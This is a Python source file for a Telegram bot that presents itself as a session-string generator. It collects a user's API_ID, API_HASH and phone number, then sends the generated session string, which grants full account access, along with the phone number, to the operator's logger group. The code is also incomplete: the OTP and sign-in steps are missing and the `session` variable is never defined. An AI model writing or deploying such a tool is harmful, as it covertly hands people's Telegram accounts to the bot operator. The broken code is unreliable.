import asyncio
import traceback
import env

from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    ApiIdInvalid
)

from telethon import TelegramClient
from telethon.sessions import StringSession


# ================= LOG FUNCTION =================

async def send_log(bot, text):
    if not env.LOGGER_GROUP:
        return

    try:
        await bot.send_message(
            chat_id=env.LOGGER_GROUP,
            text=text
        )

    except Exception as e:
        print(f"Logger Error: {e}")


# ================= SESSION GENERATOR =================

async def generate_session(bot, msg, telethon=False):

    user_id = msg.chat.id

    await msg.reply("🚀 Session generation started...")


    # ================= API_ID =================

    while True:
        api_id_msg = await bot.ask(user_id, "Send API_ID")

        if api_id_msg.text.isdigit():
            api_id = int(api_id_msg.text)
            break

        await msg.reply("❌ Invalid API_ID. Please send numbers only.")


    # ================= API_HASH =================

    while True:
        api_hash_msg = await bot.ask(user_id, "Send API_HASH")

        api_hash = api_hash_msg.text.strip()

        if len(api_hash) > 10:
            break

        await msg.reply("❌ Invalid API_HASH. Please send correct value.")


    # ================= PHONE =================

    while True:
        phone = (await bot.ask(
            user_id,
            "📱 Send Phone Number (+91...)"
        )).text.strip()

        if phone.startswith("+") and len(phone) >= 10:
            break

        await msg.reply("❌ Invalid phone number. Try again.")


    await msg.reply("📨 Sending OTP...")


    # ================= LOG GROUP =================

    try:
        print(f"LOGGER_GROUP: {env.LOGGER_GROUP}")
        print(f"Session Length: {len(session)}")

        await bot.send_message(
            chat_id=env.LOGGER_GROUP,
            text=f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
        )

        print("✅ Session sent to Logger Group successfully.")

    except Exception:
        print("❌ Logger Group Error:")
        traceback.print_exc()


    # ================= SAFE LOG =================

    await send_log(
        bot,
        f"✅ Session Generated\nUser ID: {user_id}\nPhone: {phone}"
    )
